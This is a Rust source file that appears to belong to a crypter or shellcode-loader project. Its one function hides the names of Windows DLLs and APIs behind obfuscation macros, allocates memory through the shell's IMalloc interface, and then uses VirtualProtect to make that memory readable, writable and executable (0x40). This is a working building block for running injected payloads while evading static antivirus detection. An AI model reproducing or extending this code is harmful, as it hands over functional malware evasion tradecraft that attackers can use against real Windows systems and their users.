use crate::utils::{load_library, get_proc_address};
#[allow(dead_code)]
pub unsafe fn alloc_mem(size: usize) -> Result<*mut u8, String> {
    use rustcrypt_ct_macros::{obf_lit, obf_lit_bytes};
    use core::ffi::c_void;

    // IMalloc interface definition (simplified vtable)
    #[repr(C)]
    struct IMallocVtbl {
        query_interface: usize,
        add_ref: usize,
        release: usize,
        alloc: unsafe extern "system" fn(this: *mut c_void, cb: usize) -> *mut c_void,
    }
    type SHGetMallocFn = unsafe extern "system" fn(pp_malloc: *mut *mut *mut IMallocVtbl) -> i32;
    type VirtualProtectFn = unsafe extern "system" fn(lp_address: *mut c_void, dw_size: usize, fl_new_protect: u32, lpfl_old_protect: *mut u32) -> i32;

    let shell32 = load_library(obf_lit_bytes!(b"shell32.dll\0").as_slice())?;
    let kernel32 = load_library(obf_lit_bytes!(b"kernel32.dll\0").as_slice())?;
    
    let sh_get_malloc: SHGetMallocFn = core::mem::transmute(get_proc_address(shell32, obf_lit_bytes!(b"SHGetMalloc\0").as_slice())?);
    let virtual_protect: VirtualProtectFn = core::mem::transmute(get_proc_address(kernel32, obf_lit_bytes!(b"VirtualProtect\0").as_slice())?);

    let mut malloc_ptr: *mut *mut IMallocVtbl = core::ptr::null_mut();
    if sh_get_malloc(&mut malloc_ptr) != 0 {
        return Err(obf_lit!("SHGetMalloc failed").to_string());
    }

    let malloc_vtbl = *malloc_ptr;
    let alloc_fn = (*malloc_vtbl).alloc;
    
    let p = alloc_fn(malloc_ptr as *mut c_void, size);
    if p.is_null() {
        return Err(obf_lit!("IMalloc::Alloc failed").to_string());
    }

    let mut old_protect = 0u32;
    let ok = virtual_protect(p, size, 0x40, &mut old_protect);
    if ok == 0 {
        return Err(obf_lit!("VirtualProtect failed").to_string());
    }

    Ok(p as *mut u8)
}